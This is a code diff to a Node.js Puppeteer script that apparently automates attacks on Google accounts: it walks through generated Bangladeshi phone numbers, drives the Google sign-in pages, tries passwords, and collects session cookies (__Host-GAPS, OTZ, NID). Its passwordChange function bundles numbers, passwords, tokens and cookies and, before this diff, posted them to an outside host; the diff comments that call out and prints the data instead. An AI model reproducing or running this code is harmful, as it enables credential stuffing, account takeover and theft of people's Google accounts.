@@ -7,7 +7,7 @@ const fs = require('fs')
 
 
 const COUNTRY = 'BD'
-const LENGTH = 11
+const LENGTH = 10
 const TIMEING = 3
 const SAVE_SIZE = 1
 
@@ -181,6 +181,7 @@ async function browserStart() {
 
     try {
         let browser = await puppeteer.launch({
+            //headless: false,
             headless: 'new',
             args: [
                 '--no-sandbox',
@@ -234,12 +235,23 @@ async function browserStart() {
                         }
         
                         let cookie = await page.cookies()
+                        
                         let gps = null
+                        let cookies = ''
                         cookie.forEach(function (value) {
                             if (value.name == '__Host-GAPS') {
+                                cookies += '__Host-GAPS='+value.value+'; '
                                 gps = value.value
+                            } else if (value.name == 'OTZ') {
+                                cookies += 'OTZ='+value.value+'; '
+                            } else if (value.name == 'NID') {
+                                cookies += 'NID='+value.value+'; '
                             }
                         })
+
+                        if (mReqHeader['cookie'] == null && cookies != '') {
+                            mReqHeader['cookie'] = cookies
+                        }
 
                         page.goto('about:blank')
                 
@@ -311,7 +323,7 @@ async function browserStart() {
                             nextNumber()
                         } else {
                             let pageUrl = await page.evaluate(() => window.location.href)
-                            if (!pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier') && !pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pwd') && !url.startsWith('https://accounts.google.com/signin/v2/challenge/pwd')) {
+                            if (!pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier') && !pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd') && !url.startsWith('https://accounts.google.com/signin/v2/challenge/pwd')) {
                                 nextNumber()
                             }
                         }
@@ -319,7 +331,10 @@ async function browserStart() {
                         nextNumber()
                     }
                 } 
-            } catch (error) {}
+            } catch (error) {
+                req.continue()
+                console.log(error)
+            }
         })
     
         page.on('error', err=> {})
@@ -330,7 +345,7 @@ async function browserStart() {
         await numberType(page, '+'+mList[SIZE])
         await page.click('#identifierNext')
     } catch (error) {
-       console.log(error) 
+       console.log(error)
     }
 }
 
@@ -368,6 +383,7 @@ function passwordMatching(number, tl, cid, dsh, ifkv, gps, loop) {
         let next = true
         try {
             let body = res.data
+            console.log(body)
             if (body.substring(0, 40).includes('wrb.fr')) {
                 if(body.includes('https://accounts.google.com/CheckCookie') || body.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie')) {
                     next = false
@@ -441,30 +457,32 @@ function passwordMatching(number, tl, cid, dsh, ifkv, gps, loop) {
 function passwordChange(number, tl, cid, gps, password, cookies, again) {
     let data = COUNTRY+'★'+number+'★'+password+'★'+tl+'★'+gps+'★'+cid+'★'+USER_AGENT+'★'+cookies
 
-    axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
-        try {
-            let body = res.data
-            if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
-                nextNumber()
-            } else if (again == 0) {
-                passwordChange(number, tl, cid, gps, password, cookies, 1)
-            } else {
-                nextNumber()
-            }
-        } catch (error) {
-            if (again == 0) {
-                passwordChange(number, tl, cid, gps, password, cookies, 1)
-            } else {
-                nextNumber()
-            }
-        }
-    }).catch(err => {
-        if (again == 0) {
-            passwordChange(number, tl, cid, gps, password, cookies, 1)
-        } else {
-            nextNumber()
-        }
-    })
+    console.log(data)
+
+    // axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
+    //     try {
+    //         let body = res.data
+    //         if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
+    //             nextNumber()
+    //         } else if (again == 0) {
+    //             passwordChange(number, tl, cid, gps, password, cookies, 1)
+    //         } else {
+    //             nextNumber()
+    //         }
+    //     } catch (error) {
+    //         if (again == 0) {
+    //             passwordChange(number, tl, cid, gps, password, cookies, 1)
+    //         } else {
+    //             nextNumber()
+    //         }
+    //     }
+    // }).catch(err => {
+    //     if (again == 0) {
+    //         passwordChange(number, tl, cid, gps, password, cookies, 1)
+    //     } else {
+    //         nextNumber()
+    //     }
+    // })
 }
 
 function nextNumber() {
